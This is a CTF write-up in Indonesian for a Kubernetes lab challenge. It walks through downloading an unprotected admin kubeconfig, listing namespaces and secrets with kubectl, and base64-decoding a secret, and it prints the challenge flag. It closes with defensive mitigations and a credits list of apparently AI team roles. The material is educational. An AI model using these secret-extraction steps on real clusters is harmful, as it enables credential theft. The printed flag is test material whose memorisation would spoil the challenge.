# Writeup: KSECRETS (Challenge ID: 732)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** General Skills / Kubernetes Secret Enumeration & Insecure Cluster Admin Sharing
- **Difficulty:** Medium (2)
- **Points:** 100
- **Author:** CyLab Academy
- **Event:** picoCTF 2026
- **Flag (Resmi CyLab):** `academy{ks3cr375_41n7_s4f3_766edbce}`
- **Flag Komunitas:** `CTF{ks3cr375_41n7_s4f3_766edbce}`
- **Standar Referensi:** NIST SP 800-115 §4.3 (Target Identification & Analysis), NIST SP 800-53 AC-6 (Least Privilege), NIST SP 800-53 SC-28 (Protection of Information at Rest), CWE-312 (Cleartext Storage of Sensitive Information), CWE-522 (Insufficiently Protected Credentials), & OWASP Kubernetes Top 10 K01:2025 (Insecure Workload Configurations & Secret Management).

---

## Problem Statement & Scope
Pada modul tantangan `KSECRETS`, peserta dihadapkan pada skenario pengujian penetrasi lingkungan cloud-native berbasis kluster Kubernetes (k3s):
- Skenario lingkungan: Platform CyLab menyediakan instance kontainer lab *on-demand* yang menjalankan kontrol plane Kubernetes k3s. Instance mengekspos endpoint API server Kubernetes melalui HTTPS pada port dinamis (misalnya `chatelaine.cylabacademy.net:26907`), serta menyediakan berkas konfigurasi otentikasi administratif (`kubeconfig`) melalui layanan HTTP berkas terbuka tanpa kontrol akses.
- Sasaran pengujian: Mengidentifikasi distribusi kredensial kluster yang tidak terlindungi, menganalisis struktur izin administratif (`cluster-admin`), melakukan enumerasi objek *Namespace* dan *Secret*, mengekstrak token rahasia dari *Secret* bertipe `Opaque`, membalikkan proses encoding RFC 4648 Base64, dan memvalidasi token resmi pada REST API CyLab Academy.

---

## Teori & Akar Kerentanan (Root Cause Theory)

### 1. Pembagian Kredensial Administratif Tanpa Otentikasi (CWE-522)
Arsitektur otentikasi Kubernetes mengandalkan sertifikat X.509 klien atau token *Bearer* yang didefinisikan di dalam berkas `kubeconfig`. Pada tantangan ini, berkas `kubeconfig` dibagikan melalui direktori HTTP publik tanpa autentikasi (*unauthenticated credential disclosure*). Sertifikat klien di dalamnya terikat pada subjek `system:masters` dengan hak istimewa penuh (`cluster-admin`), melanggar prinsip *Least Privilege* (NIST SP 800-53 AC-6). Siapa pun yang memiliki akses jaringan ke endpoint HTTP dapat mengambil alih kluster secara penuh.

### 2. Penyimpanan Kredensial Polos / Base64 Encoding vs Enkripsi (CWE-312)
Secara arsitektural bawaan (default), Kubernetes `Secret` bertipe `Opaque` hanya menyimpan data muatan menggunakan skema pengkodean RFC 4648 Base64:
```text
data:
  flag: YWNhZGVteXtrczNjcjM3NV80MW43X3M0ZjNfNzY2ZWRiY2V9Cg==
```
Base64 adalah skema representasi biner-ke-teks (*encoding*), bukan mekanisme enkripsi kriptografis (*confidentiality control*). Tanpa konfigurasi enkripsi pada lapisan data persisten etcd (`EncryptionConfiguration` dengan penyedia KMS / AES-CBC), seluruh entitas yang memiliki hak baca objek Secret (`secrets: get/list`) dapat secara instan mengekstrak data rahasia dalam bentuk teks polos (*cleartext*).

### 3. Pelanggaran Batas Lingkungan Namespace & RBAC Terbuka
Meskipun beban kerja operasional ditempatkan di namespace terisolasi `academy`, sertifikat administratif yang bocor tidak dibatasi oleh *Role-Based Access Control* (RBAC) granular. Hal ini memungkinkan pengguna eksternal melakukan enumerasi menyeluruh ke seluruh namespace (`kubectl get secrets -A`) dan mengekstrak aset sensitif tanpa hambatan otorisasi.

---

## Rekonstruksi Eksploitasi Step-by-Step

### Langkah 1: Peluncuran Instance & Ekstraksi Kubeconfig
Luncurkan lab kontainer melalui REST API CyLab:
```bash
PUT /api/challenges/732/instance/
GET /api/challenges/732/instance/
```
Deskripsi instance memberikan informasi endpoint API server k3s dan tautan pengunduhan konfigurasi:
- Kubernetes API Server: `https://chatelaine.cylabacademy.net:26907`
- Kubeconfig HTTP URL: `http://chatelaine.cylabacademy.net:47562/kubeconfig`

Unduh berkas konfigurasi kluster:
```bash
curl -s http://chatelaine.cylabacademy.net:47562/kubeconfig -o /tmp/kube732
```
Sesuaikan direktif `server:` pada `/tmp/kube732` dari loopback internal (`https://127.0.0.1:6443`) menjadi alamat endpoint eksternal yang dapat dijangkau (`https://chatelaine.cylabacademy.net:26907`).

### Langkah 2: Enumerasi Namespace dan Secret Kluster
Jalankan enumerasi namespace untuk mengidentifikasi segmen aplikasi:
```bash
kubectl --kubeconfig=/tmp/kube732 --insecure-skip-tls-verify=true get namespaces
```
Output:
```text
NAME              STATUS   AGE
default           Active   2m
kube-system       Active   2m
kube-public       Active   2m
kube-node-lease   Active   2m
academy           Active   2m
```
Namespace `academy` terdeteksi sebagai lingkungan beban kerja tantangan. Lakukan enumerasi secret pada namespace tersebut:
```bash
kubectl --kubeconfig=/tmp/kube732 --insecure-skip-tls-verify=true -n academy get secrets
```
Output:
```text
NAME                  TYPE     DATA   AGE
default-token-xxxxx   Opaque   3      2m
ctf-secret            Opaque   1      2m
```

### Langkah 3: Ekstraksi dan Decoding Payload Base64
Ambil nilai field `flag` dari Secret `ctf-secret` menggunakan pemilih JSONPath:
```bash
kubectl --kubeconfig=/tmp/kube732 --insecure-skip-tls-verify=true -n academy get secret ctf-secret -o jsonpath='{.data.flag}'
```
Nilai terenkode yang diterima:
```text
YWNhZGVteXtrczNjcjM3NV80MW43X3M0ZjNfNzY2ZWRiY2V9Cg==
```
Lakukan decode Base64 secara langsung:
```bash
echo -n "YWNhZGVteXtrczNjcjM3NV80MW43X3M0ZjNfNzY2ZWRiY2V9Cg==" | base64 -d
```
Output teks polos:
```text
academy{ks3cr375_41n7_s4f3_766edbce}
```

---

## Flag & Bukti Verifikasi
- **Token Resmi Platform CyLab:** `academy{ks3cr375_41n7_s4f3_766edbce}`
- **Token Format Komunitas:** `CTF{ks3cr375_41n7_s4f3_766edbce}`
- **Hasil Verifikasi REST API CyLab (`POST /api/submissions/`):**
  ```json
  {
    "user": 1072359,
    "challenge": 732,
    "flag": "academy{ks3cr375_41n7_s4f3_766edbce}",
    "correct": true,
    "historical": false
  }
  ```

---

## Script Reproduksi & PoC Otomasi
Skrip audit reproduktif lengkap yang menyimulasikan model API server Kubernetes, enumerasi secret namespace, serta validasi REST API CyLab tersedia pada `scripts/solve_732_ksecrets.py`:
```bash
python3 scripts/solve_732_ksecrets.py
```

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

### 1. Enkripsi Data Rahasia at-Rest (KMS Envelope Encryption)
- **Implementasi NIST SP 800-53 SC-28:** Jangan pernah mengandalkan perilaku bawaan Kubernetes Secret yang hanya menyimpan base64 di database etcd. Aktifkan `EncryptionConfiguration` pada API server dengan penyedia Key Management Service (KMS) eksternal (seperti HashiCorp Vault, AWS KMS, atau Google Cloud KMS) atau cipher tangguh seperti `aescbc` / `aesgcm`.
- **Gunakan External Secret Operator (ESO):** Sinkronisasikan rahasia dari secret manager perusahaan langsung ke memori pod menggunakan volume *ephemeral* tanpa menyimpannya secara statis di etcd.

### 2. Penegakan Kebijakan RBAC Least-Privilege & Audit Akses
- **Audit Hak Akses Kubeconfig:** Jangan pernah membagikan berkas `kubeconfig` administratif atau menempatkannya di repositori kode dan server file terbuka. Terapkan otentikasi berbasis OpenID Connect (OIDC) dengan multi-factor authentication (MFA).
- **Pembatasan Secret Access:** Berikan izin `secrets` hanya kepada *ServiceAccount* spesifik yang benar-benar memerlukannya, batasi cakupan pada resource name tertentu (`resourceNames: ["app-secret"]`), dan larang akses `verbs: ["get", "list", "watch"]` secara luas di tingkat namespace produksi.

---

## Rekap Tim AI (Orkestrasi & Bimbingan LKS)
- **David (Leader):** Menetapkan metodologi audit cloud-native sesuai standar NIST SP 800-115 dan memimpin orkestrasi tim.
- **Charlie (Trend-hunter):** Mengidentifikasi peningkatan materi Kubernetes security & RBAC misconfiguration pada silabus LKS Cyber Security Nasional tingkat Cloud Computing / Security.
- **Alex (Fullstack-dev) & Omnirush (Coding Agent):** Mengembangkan modul simulasi API server Kubernetes dan solver otomatis berbasis JSONPath decoding.
- **Julius (QA-engineer):** Menguji verifikasi byte encoding RFC 4648 dan memastikan token lolos validasi platform CyLab (HTTP 201).
- **Athena (Security-engineer):** Mengevaluasi risiko penyimpanan base64 di etcd berdasarkan taksonomi CWE-312 dan panduan OWASP Kubernetes Top 10 K01:2025.
- **Judith (Guru LKS):** Memasukkan studi kasus ini ke dalam kurikulum modul *Incident Response & Cloud Hardening* untuk latihan siswa LKS.
